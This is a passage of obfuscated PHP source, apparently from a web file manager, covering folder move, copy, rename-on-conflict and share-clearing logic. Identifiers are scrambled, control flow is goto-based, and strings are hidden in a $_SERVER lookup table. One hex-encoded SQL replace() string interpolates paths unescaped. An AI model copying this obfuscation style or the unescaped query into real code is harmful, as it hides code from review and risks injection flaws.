$D§∆“¥Ô¢Ê; } goto fæ◊üé≥∏°; bâœﬂ©∂ìâ: if ($C˘»⁄òÉéÿ[$f¨£öû©¯ç[367]] != $f¨£öû©¯ç[84]) { $Fâï¿Âµ≠∆[$f¨£öû©¯ç[493]][] = $C˘»⁄òÉéÿ[$f¨£öû©¯ç[415]]; return $D§∆“¥Ô¢Ê; } $cÛ¢ÔƒóãÁ = array(); $Aè¿Õàä“ƒ = array(); goto Aâ‹¢±”˘Ó; d∂†Í∆õ›∑: $this->addAll($Aè¿Õàä“ƒ, array(), !1); $A‘ù®…˘ç€ = $this->where(array($f¨£öû©¯ç[457] => $D§∆“¥Ô¢Ê))->select(); $AÉâ¬äó©í = $this->_childrenMakeRelation($cÛ¢ÔƒóãÁ, $A‘ù®…˘ç€); goto A„äï¿¡∑˘; EÈÇ›ﬁà±Ê: $this->chunkEventSet($f¨£öû©¯ç[507], array($f¨£öû©¯ç[508], $a§åôŸÁøˆ, $A∂±ˆò˜æŸ)); $this->saveAll($BÃ∞≥ê≥’®); return $D§∆“¥Ô¢Ê; goto e≥Á‚ã€áÊ; FÖ∂íœƒ◊ó: $f¨£öû©¯ç =& $_SERVER[£¿ÌÙëü¡¯¯]; $C˘»⁄òÉéÿ = $this->sourceInfoCache($aÕÜû≥ã˘˘); $bÚ‡É•È‡Ç = $this->sourceInfoCache($fˆÇÃÉÖ≤ﬁ); goto báøÉºùæè; e≥Á‚ã€áÊ: } private function _childrenMakeRelation($F¡—ºÂ÷±ç, $B¨ª≥Á¡ÏŒ) { $FÙ÷…ŸÁ’Ï =& $_SERVER[£¿ÌÙëü¡¯¯]; $aè¯√–∑¿¬ = array(); $dò”ÀöÏ†“ = array(); foreach ($F¡—ºÂ÷±ç as $D¶à⁄≥Œ∏Ã) { $fäÿÆ€™”ç = $D¶à⁄≥Œ∏Ã[$FÙ÷…ŸÁ’Ï[28]] . $FÙ÷…ŸÁ’Ï[8] . $D¶à⁄≥Œ∏Ã[$FÙ÷…ŸÁ’Ï[455]]; $aè¯√–∑¿¬[$fäÿÆ€™”ç] = $D¶à⁄≥Œ∏Ã[$FÙ÷…ŸÁ’Ï[366]]; } foreach ($B¨ª≥Á¡ÏŒ as $D¶à⁄≥Œ∏Ã) { $fäÿÆ€™”ç = $D¶à⁄≥Œ∏Ã[$FÙ÷…ŸÁ’Ï[28]] . $FÙ÷…ŸÁ’Ï[8] . $D¶à⁄≥Œ∏Ã[$FÙ÷…ŸÁ’Ï[455]]; $a˘°Ó´ç”é = $aè¯√–∑¿¬[$fäÿÆ€™”ç]; $dò”ÀöÏ†“[$a˘°Ó´ç”é] = $D¶à⁄≥Œ∏Ã[$FÙ÷…ŸÁ’Ï[366]]; } return $dò”ÀöÏ†“; } private function _childrenMatch($F¡˘™ÈÇû›, $bâˆ£‚≤√ä, $fÚıã∫ä∆´) { goto D≠§…‡÷ü°; cƒè∫ì•ªå: $A≤æ™•∂ü© = $FÕñà◊ãÖø[count($FÕñà◊ãÖø) - 1]; return array($dÍıÕ∂ﬁØ«[457] => $A≤æ™•∂ü©, $dÍıÕ∂ﬁØ«[455] => $F¬ãª´ªë˘); goto bƒëÒÉ»§Ñ; Bîà ’¬ô¢: foreach ($DîÀÛØå÷… as $d€™í»Ëı›) { if (isset($F¡˘™ÈÇû›[$d€™í»Ëı›])) { $F¬ãª´ªë˘ .= $F¡˘™ÈÇû›[$d€™í»Ëı›] . $dÍıÕ∂ﬁØ«[509]; } } $F¬ãª´ªë˘ = rtrim($F¬ãª´ªë˘, $dÍıÕ∂ﬁØ«[47]) . $dÍıÕ∂ﬁØ«[47]; $FÕñà◊ãÖø = $this->parentLevelArray($F¬ãª´ªë˘); goto cƒè∫ì•ªå; D≠§…‡÷ü°: $dÍıÕ∂ﬁØ« =& $_SERVER[£¿ÌÙëü¡¯¯]; $F¬ãª´ªë˘ = $fÚıã∫ä∆´[$dÍıÕ∂ﬁØ«[455]]; $DîÀÛØå÷… = $this->parentLevelArray($bâˆ£‚≤√ä[$dÍıÕ∂ﬁØ«[455]]); goto Bîà ’¬ô¢; bƒëÒÉ»§Ñ: } private function _makeItemData($FôøËò≥µé, $d†∑ˆ´ñ·«, $féÎñ´âÃÑ) { $dÏœà£øÑé =& $_SERVER[£¿ÌÙëü¡¯¯]; $aÑÏÿŒıËï = array($dÏœà£øÑé[510] => $FôøËò≥µé[$dÏœà£øÑé[367]], $dÏœà£øÑé[383] => $féÎñ´âÃÑ, $dÏœà£øÑé[511] => $FôøËò≥µé[$dÏœà£øÑé[369]], $dÏœà£øÑé[416] => $FôøËò≥µé[$dÏœà£øÑé[415]], $dÏœà£øÑé[512] => $FôøËò≥µé[$dÏœà£øÑé[78]], $dÏœà£øÑé[513] => $d†∑ˆ´ñ·«[$dÏœà£øÑé[368]], $dÏœà£øÑé[514] => $d†∑ˆ´ñ·«[$dÏœà£øÑé[452]], $dÏœà£øÑé[515] => USER_ID, $dÏœà£øÑé[516] => USER_ID, $dÏœà£øÑé[365] => $d†∑ˆ´ñ·«[$dÏœà£øÑé[366]], $dÏœà£øÑé[517] => $d†∑ˆ´ñ·«[$dÏœà£øÑé[455]] . $d†∑ˆ´ñ·«[$dÏœà£øÑé[366]] . $dÏœà£øÑé[47], $dÏœà£øÑé[392] => 0, $dÏœà£øÑé[518] => $dÏœà£øÑé[33]); return $aÑÏÿŒıËï; } private function _copyApplyMeta($Bùç⁄íÑ˜í, &$AÓ⁄‹‡≥«á) { $Eƒ¢äÕ¬± =& $_SERVER[£¿ÌÙëü¡¯¯]; $FêÉ—Íõµü = $Bùç⁄íÑ˜í[$Eƒ¢äÕ¬±[366]]; $CëøÕÚÚçÚ = $Bùç⁄íÑ˜í[$Eƒ¢äÕ¬±[28]]; if (!isset($Bùç⁄íÑ˜í[$Eƒ¢äÕ¬±[519]]) || !$Bùç⁄íÑ˜í[$Eƒ¢äÕ¬±[519]] || $Bùç⁄íÑ˜í[$Eƒ¢äÕ¬±[519]] == $Eƒ¢äÕ¬±[464]) { $AÓ⁄‹‡≥«á[$Eƒ¢äÕ¬±[495]][] = array($Eƒ¢äÕ¬±[366], $FêÉ—Íõµü, $Eƒ¢äÕ¬±[519], short_id($FêÉ—Íõµü)); } if (Input::check($CëøÕÚÚçÚ, $Eƒ¢äÕ¬±[520])) { $AÓ⁄‹‡≥«á[$Eƒ¢äÕ¬±[494]][] = array($Eƒ¢äÕ¬±[366] => $FêÉ—Íõµü, $Eƒ¢äÕ¬±[90] => $Eƒ¢äÕ¬±[412], $Eƒ¢äÕ¬±[354] => str_replace($Eƒ¢äÕ¬±[50], $Eƒ¢äÕ¬±[33], Pinyin::encode($CëøÕÚÚçÚ))); $AÓ⁄‹‡≥«á[$Eƒ¢äÕ¬±[494]][] = array($Eƒ¢äÕ¬±[366] => $FêÉ—Íõµü, $Eƒ¢äÕ¬±[90] => $Eƒ¢äÕ¬±[411], $Eƒ¢äÕ¬±[354] => Pinyin::encode($CëøÕÚÚçÚ, $Eƒ¢äÕ¬±[521])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Aíœ®ÿƒ‰÷) { goto dö∆Ì“¥ä˘; dö∆Ì“¥ä˘: $FÍÂ∂‚Á«¯ =& $_SERVER[£¿ÌÙëü¡¯¯]; $e∂ßéÂƒäÇ = $this->sourceInfo($Aíœ®ÿƒ‰÷); $b°Ò·Íéïä = $FÍÂ∂‚Á«¯[522]; goto BÈ©∂«∫ô¨; BÈ©∂«∫ô¨: $CÃäÈº ÉÕ = array($FÍÂ∂‚Á«¯[455] => array($FÍÂ∂‚Á«¯[475], $e∂ßéÂƒäÇ[$FÍÂ∂‚Á«¯[455]] . $Aíœ®ÿƒ‰÷ . $FÍÂ∂‚Á«¯[476]), $FÍÂ∂‚Á«¯[393] => 0); $dÍ¥ñã‡“¢ = $this->field($b°Ò·Íéïä)->where($CÃäÈº ÉÕ)->select(); if (!$dÍ¥ñã‡“¢) { return; } goto CÌâäåõÜ—; CÌâäåõÜ—: $dÍ¥ñã‡“¢ = array_to_keyvalue($dÍ¥ñã‡“¢, $FÍÂ∂‚Á«¯[366]); foreach ($dÍ¥ñã‡“¢ as $EÆ¶ÁÉüó∞) { $cª≈˘ˆöπ¥ = $EÆ¶ÁÉüó∞[$FÍÂ∂‚Á«¯[457]]; $Aíœ®ÿƒ‰÷ = $EÆ¶ÁÉüó∞[$FÍÂ∂‚Á«¯[366]]; if (!isset($this->_childrenListCache[$Aíœ®ÿƒ‰÷]) && $EÆ¶ÁÉüó∞[$FÍÂ∂‚Á«¯[367]] == $FÍÂ∂‚Á«¯[84]) { $this->_childrenListCache[$Aíœ®ÿƒ‰÷] = array(); } if (!isset($this->_childrenListCache[$cª≈˘ˆöπ¥])) { $this->_childrenListCache[$cª≈˘ˆöπ¥] = array(); } $this->_childrenListCache[$cª≈˘ˆöπ¥][$Aíœ®ÿƒ‰÷] = $EÆ¶ÁÉüó∞; $this->_childrenItemCache[$Aíœ®ÿƒ‰÷] = $EÆ¶ÁÉüó∞; } goto E·¢û ©ÉÛ; E·¢û ©ÉÛ: } private function _childrenListAll($C¯≤Á§€é˜, &$DÚñ˘¿÷™á) { $f”¿∆ë€øŸ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!isset($this->_childrenListCache[$C¯≤Á§€é˜])) { return; } $aè‘ô€ºçÊ = $this->_childrenListCache[$C¯≤Á§€é˜]; foreach ($aè‘ô€ºçÊ as $Eê∞‡«‰œÜ => $b€£ûèÈ´) { $DÚñ˘¿÷™á[$Eê∞‡«‰œÜ] = $b€£ûèÈ´; if ($b€£ûèÈ´[$f”¿∆ë€øŸ[367]] == $f”¿∆ë€øŸ[84]) { $this->_childrenListAll($Eê∞‡«‰œÜ, $DÚñ˘¿÷™á); } } } private function sourceInfoCache($e≈çºÁ¥ÆŒ) { if (isset($this->_childrenItemCache[$e≈çºÁ¥ÆŒ])) { return $this->_childrenItemCache[$e≈çºÁ¥ÆŒ]; } return $this->sourceInfo($e≈çºÁ¥ÆŒ); } private function _childrenList($Eå¿º∆–Á‘) { if (isset($this->_childrenListCache[$Eå¿º∆–Á‘])) { return $this->_childrenListCache[$Eå¿º∆–Á‘]; } return $this->_childrenListSelect($Eå¿º∆–Á‘); } private function _childrenListSelect($Dí‡öÎ”å÷) { goto cÔ»‘Ñµí´; DîÉåﬁÎﬁû: foreach ($A¬¨ì˜¨«˜ as $Dí‡öÎ”å÷ => $f±òãî•ñÁ) { $this->_childrenItemCache[$Dí‡öÎ”å÷] = $f±òãî•ñÁ; } return $A¬¨ì˜¨«˜; goto fŸ≥´åòÁπ; cÔ»‘Ñµí´: $dÑÔ€´º∆° =& $_SERVER[£¿ÌÙëü¡¯¯]; $b¯∫◊ÉÕÍ = array($dÑÔ€´º∆°[457] => $Dí‡öÎ”å÷, $dÑÔ€´º∆°[393] => 0); $A∞ØÖ°ØÈ® = $this->where($b¯∫◊ÉÕÍ)->select(); goto a “ëØ≥ì¶; a “ëØ≥ì¶: $A∞ØÖ°ØÈ® = $A∞ØÖ°ØÈ® ? $A∞ØÖ°ØÈ® : array(); $A¬¨ì˜¨«˜ = array_to_keyvalue($A∞ØÖ°ØÈ®, $dÑÔ€´º∆°[366]); $this->_childrenListCache[$Dí‡öÎ”å÷] = $A¬¨ì˜¨«˜; goto DîÉåﬁÎﬁû; fŸ≥´åòÁπ: } private function fileNameExistCache($b„Óç™•ÔÌ, $e„≈«Õ⁄≠Í) { $CÀúÊ’·°— =& $_SERVER[£¿ÌÙëü¡¯¯]; $e„≈«Õ⁄≠Í = strtolower($e„≈«Õ⁄≠Í); $eÜÌ≠ÖíÒ¿ = $this->_childrenList($b„Óç™•ÔÌ); foreach ($eÜÌ≠ÖíÒ¿ as $E«Î®ÕÆØÖ) { if ($e„≈«Õ⁄≠Í == strtolower($E«Î®ÕÆØÖ[$CÀúÊ’·°—[28]])) { return $E«Î®ÕÆØÖ[$CÀúÊ’·°—[366]]; } } return !1; } private function fileNameAutoCache($C”©„à≈å», $eù≤¨ë——º, $B§æ√ô“πø, $aëõ°‹ÊÍÒ) { $aÛü·æﬁØÍ =& $_SERVER[£¿ÌÙëü¡¯¯]; $bœπÃÒ∫Ûπ = $this->_childrenList($C”©„à≈å»); $eÎÓè˘Òº¯ = array_to_keyvalue($bœπÃÒ∫Ûπ, $aÛü·æﬁØÍ[33], $aÛü·æﬁØÍ[28]); return $this->fileNameAutoGet($eÎÓè˘Òº¯, $eù≤¨ë——º, $B§æ√ô“πø, $aëõ°‹ÊÍÒ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($F®·ﬂˆÀî˘, $DºªéÎƒ¶„, $E–é†„Û‰ô = REPEAT_REPLACE, $BÒΩÈ∂ÑãÆ = '') { goto Aø≈¶ﬁ∂ç‰; aÒåäëù˘è: Hook::trigger($eÌæÏ’’Âã[523], $D¬óâÉØÛã); if ($CÒŸæ˜¨•∂[$eÌæÏ’’Âã[457]] == $DºªéÎƒ¶„ && $BÒΩÈ∂ÑãÆ != $CÒŸæ˜¨•∂[$eÌæÏ’’Âã[28]]) { $dÃı≥∫±ª˜ = $this->fileNameExist($DºªéÎƒ¶„, $BÒΩÈ∂ÑãÆ); if ($dÃı≥∫±ª˜ && $CÒŸæ˜¨•∂[$eÌæÏ’’Âã[367]] == $eÌæÏ’’Âã[464]) { goto BâóÎ‹Ì¨…; Dºá´åı„: $this->remove($F®·ﬂˆÀî˘, !1); $this->folderSizeReset($DºªéÎƒ¶„); Hook::trigger($eÌæÏ’’Âã[524], $D¬óâÉØÛã); goto Eåéæ∫‚‰ê; BâóÎ‹Ì¨…: $EäÿÛüóÕº = $this->sourceInfo($dÃı≥∫±ª˜); $CÁäﬁïµı© = $this->fileHistory($EäÿÛüóÕº, $CÒŸæ˜¨•∂[$eÌæÏ’’Âã[415]], $CÒŸæ˜¨•∂[$eÌæÏ’’Âã[78]]); if (!$CÁäﬁïµı©) { Model($eÌæÏ’’Âã[418])->remove($CÒŸæ˜¨•∂[$eÌæÏ’’Âã[415]]); } goto Dºá´åı„; Eåéæ∫‚‰ê: return $dÃı≥∫±ª˜; goto c±Öœà‚Â≥; c±Öœà‚Â≥: } } $cËÖÉä»≈â = $BÒΩÈ∂ÑãÆ ? $BÒΩÈ∂ÑãÆ : $CÒŸæ˜¨•∂[$eÌæÏ’’Âã[28]]; goto bˆëÒ˜¢≥°; A®–Êèà©’: Hook::trigger($eÌæÏ’’Âã[524], $D¬óâÉØÛã); return $f∂∆œäØí†; goto còî∏ﬁâèë; C¡òä¨ÛíÖ: $this->folderSizeReset($CÒŸæ˜¨•∂[$eÌæÏ’’Âã[457]]); $this->folderSizeReset($DºªéÎƒ¶„); $A¥√ËÜ…¥¯ = array($CÒŸæ˜¨•∂[$eÌæÏ’’Âã[457]], $DºªéÎƒ¶„); goto B∂ä⁄ë∑ Ö; Aø≈¶ﬁ∂ç‰: $eÌæÏ’’Âã =& $_SERVER[£¿ÌÙëü¡¯¯]; $CÒŸæ˜¨•∂ = $this->sourceInfo($F®·ﬂˆÀî˘); $eñÌ‹≠Ê™è = $this->sourceInfo($DºªéÎƒ¶„); goto EõÂíË‘; Eπ‚Õ∆§›Ô: if ($DÛˆ“é–Ü§ && $e„Ç‚∞ÏÀÃ[$eÌæÏ’’Âã[525]]) { $this->remove($F®·ﬂˆÀî˘, !1); } $this->lockMoveEnd($F®·ﬂˆÀî˘); $this->lockWriteEnd($DºªéÎƒ¶„, $cËÖÉä»≈â); goto C¡òä¨ÛíÖ; B∂ä⁄ë∑ Ö: if ($CÒŸæ˜¨•∂[$eÌæÏ’’Âã[367]] == $eÌæÏ’’Âã[84]) { $A¥√ËÜ…¥¯[] = $F®·ﬂˆÀî˘; } $this->updateModifyTime($A¥√ËÜ…¥¯); Model($eÌæÏ’’Âã[497])->eventMove($F®·ﬂˆÀî˘, $CÒŸæ˜¨•∂[$eÌæÏ’’Âã[457]], $DºªéÎƒ¶„); goto A®–Êèà©’; f≥ÿºõÜø·: $this->clearShare($F®·ﬂˆÀî˘, $DºªéÎƒ¶„); $DÛˆ“é–Ü§ = $this->fileNameExistCache($DºªéÎƒ¶„, $CÒŸæ˜¨•∂[$eÌæÏ’’Âã[28]]); $f∂∆œäØí† = $this->_move($F®·ﬂˆÀî˘, $DºªéÎƒ¶„, $E–é†„Û‰ô, $e„Ç‚∞ÏÀÃ, $BÒΩÈ∂ÑãÆ); goto b√¯˜µ·Æ€; b√¯˜µ·Æ€: $this->sourceCacheClear(); if ($CÒŸæ˜¨•∂[$eÌæÏ’’Âã[367]] == $eÌæÏ’’Âã[84] && $DÛˆ“é–Ü§) { $this->folderSizeResetChildren($f∂∆œäØí†); } Model($eÌæÏ’’Âã[164])->linkAdd($e„Ç‚∞ÏÀÃ[$eÌæÏ’’Âã[493]]); goto Eπ‚Õ∆§›Ô; bˆëÒ˜¢≥°: $this->lockMoveStart($F®·ﬂˆÀî˘); $this->lockWriteStart($DºªéÎƒ¶„, $cËÖÉä»≈â); $e„Ç‚∞ÏÀÃ = array($eÌæÏ’’Âã[493] => array(), $eÌæÏ’’Âã[525] => !1); goto f≥ÿºõÜø·; EõÂíË‘: $D¬óâÉØÛã = $this->pathInfoMore($F®·ﬂˆÀî˘); if ($this->isParentOf($F®·ﬂˆÀî˘, $DºªéÎƒ¶„)) { return !1; } if (!$CÒŸæ˜¨•∂ || !$eñÌ‹≠Ê™è || $eñÌ‹≠Ê™è[$eÌæÏ’’Âã[367]] != $eÌæÏ’’Âã[84]) { return !1; } goto aÒåäëù˘è; còî∏ﬁâèë: } private function _move($A•¡˜ò†π—, $EáÂåπ§‚±, $bÍÌÉÕòÿ±, &$d≠â≈á¿”ƒ, $d∫∆ˆÕ≥≥± = '') { goto bÿÒêÁµ÷—; BÂ≤ªö÷’ø: $this->lockWriteStart($EáÂåπ§‚±, $CîπÍÊãºû); if (!$dúûÉÁ∏™ú) { return $this->_moveForce($A•¡˜ò†π—, $EáÂåπ§‚±, $CîπÍÊãºû); } $Aãﬂö´ˆ¡å = $dúûÉÁ∏™ú; goto c¨Ñç±ËÑü; BÚ’¢‚Ëòã: return $Aãﬂö´ˆ¡å; goto e¿†’Ò∆ı∫; c¨Ñç±ËÑü: $E‚œèÀÛàò = !1; if ($e‹€âÿÇÓ≤) { if ($bÍÌÉÕòÿ± == REPEAT_RENAME_FOLDER) { $CîπÍÊãºû = $this->fileNameAuto($EáÂåπ§‚±, $CîπÍÊãºû, $bÍÌÉÕòÿ±, $e‹€âÿÇÓ≤); $Aãﬂö´ˆ¡å = $this->_moveForce($A•¡˜ò†π—, $EáÂåπ§‚±, $CîπÍÊãºû); } else { if ($bÍÌÉÕòÿ± == REPEAT_RENAME_FOLDER) { $bÍÌÉÕòÿ± = REPEAT_RENAME; } $B û£»°Ÿ∏ = $this->_childrenListSelect($A•¡˜ò†π—); foreach ($B û£»°Ÿ∏ as $dœìﬂÁ€√°) { $this->_move($dœìﬂÁ€√°[$d†ö·◊©Œ‹[366]], $dúûÉÁ∏™ú, $bÍÌÉÕòÿ±, $d≠â≈á¿”ƒ); } $E‚œèÀÛàò = !0; } } else { if ($bÍÌÉÕòÿ± == REPEAT_SKIP) { $E‚œèÀÛàò = !0; } else { if ($bÍÌÉÕòÿ± == REPEAT_RENAME || $bÍÌÉÕòÿ± == REPEAT_RENAME_FOLDER) { $CîπÍÊãºû = $this->fileNameAuto($EáÂåπ§‚±, $CîπÍÊãºû, $bÍÌÉÕòÿ±, $e‹€âÿÇÓ≤); $Aãﬂö´ˆ¡å = $this->_moveForce($A•¡˜ò†π—, $EáÂåπ§‚±, $CîπÍÊãºû); } else { if ($bÍÌÉÕòÿ± == REPEAT_REPLACE) { $c≈æÜ”ª„È = $this->sourceInfoCache($dúûÉÁ∏™ú); $eÑ˜À®—†æ = $this->fileHistory($c≈æÜ”ª„È, $E‘⁄û¡Òöè[$d†ö·◊©Œ‹[415]], $E‘⁄û¡Òöè[$d†ö·◊©Œ‹[78]]); if ($eÑ˜À®—†æ) { $d≠â≈á¿”ƒ[$d†ö·◊©Œ‹[493]][] = $E‘⁄û¡Òöè[$d†ö·◊©Œ‹[415]]; } else { $E‚œèÀÛàò = !0; } } } } } if ($E‚œèÀÛàò && !$d≠â≈á¿”ƒ[$d†ö·◊©Œ‹[525]]) { $d≠â≈á¿”ƒ[$d†ö·◊©Œ‹[525]] = !0; } goto BÚ’¢‚Ëòã; bÿÒêÁµ÷—: $d†ö·◊©Œ‹ =& $_SERVER[£¿ÌÙëü¡¯¯]; $E‘⁄û¡Òöè = $this->sourceInfo($A•¡˜ò†π—); $e‹€âÿÇÓ≤ = $E‘⁄û¡Òöè[$d†ö·◊©Œ‹[367]] == $d†ö·◊©Œ‹[84]; goto DõÀéûÀÁ°; DõÀéûÀÁ°: $CîπÍÊãºû = $d∫∆ˆÕ≥≥± ? $d∫∆ˆÕ≥≥± : $E‘⁄û¡Òöè[$d†ö·◊©Œ‹[28]]; $dúûÉÁ∏™ú = $this->fileNameExistCache($EáÂåπ§‚±, $CîπÍÊãºû); $this->lockMoveStart($A•¡˜ò†π—); goto BÂ≤ªö÷’ø; e¿†’Ò∆ı∫: } private function _moveForce($FÓÑöŸ´≥À, $BΩüÓÔ≤øŒ, $e¥“§ŸÁƒë) { goto b÷∂∏ÛöÑ„; b∞ÿÎµ‹∑è: if ($BÎƒã–Ñ–€) { $b¥ΩÙÑéé = array($f‰∫Öı≠Ÿß[517] => array($f‰∫Öı≠Ÿß[475], $b⁄õÉß∞óÇ[$f‰∫Öı≠Ÿß[455]] . $b⁄õÉß∞óÇ[$f‰∫Öı≠Ÿß[366]] . $f‰∫Öı≠Ÿß[476])); $FÜé∂¡⁄Â¿ = $b⁄õÉß∞óÇ[$f‰∫Öı≠Ÿß[455]] . $b⁄õÉß∞óÇ[$f‰∫Öı≠Ÿß[366]] . $f‰∫Öı≠Ÿß[47]; $eÏë•¯Ô≥¨ = $A´ÂÎØïù∏[$f‰∫Öı≠Ÿß[455]] . $A´ÂÎØïù∏[$f‰∫Öı≠Ÿß[366]] . $f‰∫Öı≠Ÿß[47] . $b⁄õÉß∞óÇ[$f‰∫Öı≠Ÿß[366]] . $f‰∫Öı≠Ÿß[47]; $C¬ãÏ¯∂å˜ = array($f‰∫Öı≠Ÿß[517] => array($f‰∫Öı≠Ÿß[526], "\x72\x65\160\x6c\141\143\x65\50\x70\x61\x72\145\x6e\x74\114\x65\166\x65\154\54\x27{$FÜé∂¡⁄Â¿}\x27\54\47{$eÏë•¯Ô≥¨}\47\51"), $f‰∫Öı≠Ÿß[513] => $A´ÂÎØïù∏[$f‰∫Öı≠Ÿß[368]], $f‰∫Öı≠Ÿß[514] => $A´ÂÎØïù∏[$f‰∫Öı≠Ÿß[452]]); if ($b¥‚ÏÇîî≈) { $C¬ãÏ¯∂å˜[$f‰∫Öı≠Ÿß[392]] = 0; } $this->where($b¥ΩÙÑéé)->data($C¬ãÏ¯∂å˜)->save(); } $this->where(array($f‰∫Öı≠Ÿß[380] => $FÓÑöŸ´≥À))->data($a¯ŸÒ≠¶µÜ)->save(); return $FÓÑöŸ´≥À; goto cÆ®è∞ÒÑ¡; b÷∂∏ÛöÑ„: $f‰∫Öı≠Ÿß =& $_SERVER[£¿ÌÙëü¡¯¯]; $b⁄õÉß∞óÇ = $this->sourceInfo($FÓÑöŸ´≥À); $A´ÂÎØïù∏ = $this->sourceInfo($BΩüÓÔ≤øŒ); goto Bò˜Ô‚üèè; c™áßÏ◊ıÕ: if (!$eåÎ‚∏çŒî) { Model($f‰∫Öı≠Ÿß[450])->authClear($FÓÑöŸ´≥À); } $b¥‚ÏÇîî≈ = $b⁄õÉß∞óÇ[$f‰∫Öı≠Ÿß[393]] == $f‰∫Öı≠Ÿß[84] && $A´ÂÎØïù∏[$f‰∫Öı≠Ÿß[393]] != $f‰∫Öı≠Ÿß[84]; if ($b¥‚ÏÇîî≈) { $a¯ŸÒ≠¶µÜ[$f‰∫Öı≠Ÿß[392]] = 0; } goto b∞ÿÎµ‹∑è; Bò˜Ô‚üèè: $BÎƒã–Ñ–€ = $b⁄õÉß∞óÇ[$f‰∫Öı≠Ÿß[367]] == $f‰∫Öı≠Ÿß[84]; $a¯ŸÒ≠¶µÜ = array($f‰∫Öı≠Ÿß[365] => $A´ÂÎØïù∏[$f‰∫Öı≠Ÿß[366]], $f‰∫Öı≠Ÿß[517] => $A´ÂÎØïù∏[$f‰∫Öı≠Ÿß[455]] . $A´ÂÎØïù∏[$f‰∫Öı≠Ÿß[366]] . $f‰∫Öı≠Ÿß[47], $f‰∫Öı≠Ÿß[513] => $A´ÂÎØïù∏[$f‰∫Öı≠Ÿß[368]], $f‰∫Öı≠Ÿß[514] => $A´ÂÎØïù∏[$f‰∫Öı≠Ÿß[452]], $f‰∫Öı≠Ÿß[516] => USER_ID, $f‰∫Öı≠Ÿß[383] => $e¥“§ŸÁƒë); $eåÎ‚∏çŒî = $b⁄õÉß∞óÇ[$f‰∫Öı≠Ÿß[368]] == SourceModel::TYPE_GROUP && $A´ÂÎØïù∏[$f‰∫Öı≠Ÿß[368]] == SourceModel::TYPE_GROUP && $b⁄õÉß∞óÇ[$f‰∫Öı≠Ÿß[452]] == $A´ÂÎØïù∏[$f‰∫Öı≠Ÿß[452]]; goto c™áßÏ◊ıÕ; cÆ®è∞ÒÑ¡: } private function clearShare($B†çø∂åæÿ, $cºÑü¶¥∞≤) { goto AΩ‡è†Ó¿„; AΩ‡è†Ó¿„: $cÉ¯ùûüÜ„ =& $_SERVER[£¿ÌÙëü¡¯¯]; $AëÖ„à⁄àÙ = $this->sourceInfo($B†çø∂åæÿ); $F»ê¡ıéúª = $this->sourceInfo($cºÑü¶¥∞≤); goto a€ˆµÒ„›À; aëÒÛö¿¡Ú: if (!$D∏≠Ÿæ¯¬É) { return; } $D∏≠Ÿæ¯¬É = array_to_keyvalue($D∏≠Ÿæ¯¬É, $cÉ¯ùûüÜ„[33], $cÉ¯ùûüÜ„[437]); $B≠Ã◊∏¢¢ê = array($cÉ¯ùûüÜ„[437] => array($cÉ¯ùûüÜ„[7], $D∏≠Ÿæ¯¬É)); goto e∑â∫…ıàù; e∑â∫…ıàù: Model($cÉ¯ùûüÜ„[528])->where($B≠Ã◊∏¢¢ê)->save(array($cÉ¯ùûüÜ„[444] => 0)); Model($cÉ¯ùûüÜ„[529])->where($B≠Ã◊∏¢¢ê)->delete(); goto eÛ¬€ÛÃ ¬; a€ˆµÒ„›À: if ($AëÖ„à⁄àÙ[$cÉ¯ùûüÜ„[452]] == $F»ê¡ıéúª[$cÉ¯ùûüÜ„[452]] && $AëÖ„à⁄àÙ[$cÉ¯ùûüÜ„[368]] == $cÉ¯ùûüÜ„[527]) { return; } $B≠Ã◊∏¢¢ê = array($cÉ¯ùûüÜ„[455] => array($cÉ¯ùûüÜ„[475], $AëÖ„à⁄àÙ[$cÉ¯ùûüÜ„[455]] . $B†çø∂åæÿ . $cÉ¯ùûüÜ„[476])); $CÁò¢Ì®ã√ = $this->field($cÉ¯ùûüÜ„[380])->where($B≠Ã◊∏¢¢ê)->getField($cÉ¯ùûüÜ„[366], !0); goto b¬®Ê∑Ç…˘; b¬®Ê∑Ç…˘: if (!$CÁò¢Ì®ã√) { return; } $B≠Ã◊∏¢¢ê = array($cÉ¯ùûüÜ„[366] => array($cÉ¯ùûüÜ„[7], $CÁò¢Ì®ã√), $cÉ¯ùûüÜ„[444] => 1); $D∏≠Ÿæ¯¬É = Model($cÉ¯ùûüÜ„[528])->field($cÉ¯ùûüÜ„[437])->where($B≠Ã◊∏¢¢ê)->select(); goto aëÒÛö¿¡Ú; eÛ¬€ÛÃ ¬: } public function copyFolderFromIO($c°é€ñ‘íΩ, $Cƒ°Œå‰øì, $BËØπûõàÑ, $eâ±‚›™úÙ, $E¯¥÷Ω·ùÔ, $Dåæ»ñÔÕÆ = false) { goto FÉ÷≥òßº»; fÿ·æË£ìÏ: if ($A≤∂⁄±ﬂ±å) { $this->_childrenAllMake($A≤∂⁄±ﬂ±å); } Hook::trigger($e¡ï∏»◊ﬂ⁄[531]); $this->_copyChildTo($c°é€ñ‘íΩ, $Cƒ°Œå‰øì, $eÌç™¬Æºâ, $eâ±‚›™úÙ, $aó¨Ÿﬂ∞õå, $E¯¥÷Ω·ùÔ); goto B≠Ç⁄∫ŸÛ…; Aö…ˆ»¯ÈÑ: Model($e¡ï∏»◊ﬂ⁄[496])->addAll($aó¨Ÿﬂ∞õå[$e¡ï∏»◊ﬂ⁄[494]], array(), !0); Model($e¡ï∏»◊ﬂ⁄[497])->eventCopy($eÌç™¬Æºâ); $this->saveAll($aó¨Ÿﬂ∞õå[$e¡ï∏»◊ﬂ⁄[495]]); goto bÑèòºÿÜ†; A¬ÎóﬂÁ®ñ: $this->updateModifyTime($BËØπûõàÑ); return $eÌç™¬Æºâ; goto C˘Øº˜⁄¢Õ; DìÓé›Öˆæ: $A≤∂⁄±ﬂ±å = $this->fileNameExist($BËØπûõàÑ, $EÚÇàõîï∞); $eÌç™¬Æºâ = $this->mkdir($BËØπûõàÑ, $EÚÇàõîï∞, $eâ±‚›™úÙ); if (!$A≤∂⁄±ﬂ±å || $eâ±‚›™úÙ == REPEAT_RENAME_FOLDER) { $eâ±‚›™úÙ = !1; } goto fÿ·æË£ìÏ; FÉ÷≥òßº»: $e¡ï∏»◊ﬂ⁄ =& $_SERVER[£¿ÌÙëü¡¯¯]; $aó¨Ÿﬂ∞õå = array($e¡ï∏»◊ﬂ⁄[494] => array(), $e¡ï∏»◊ﬂ⁄[495] => array(), 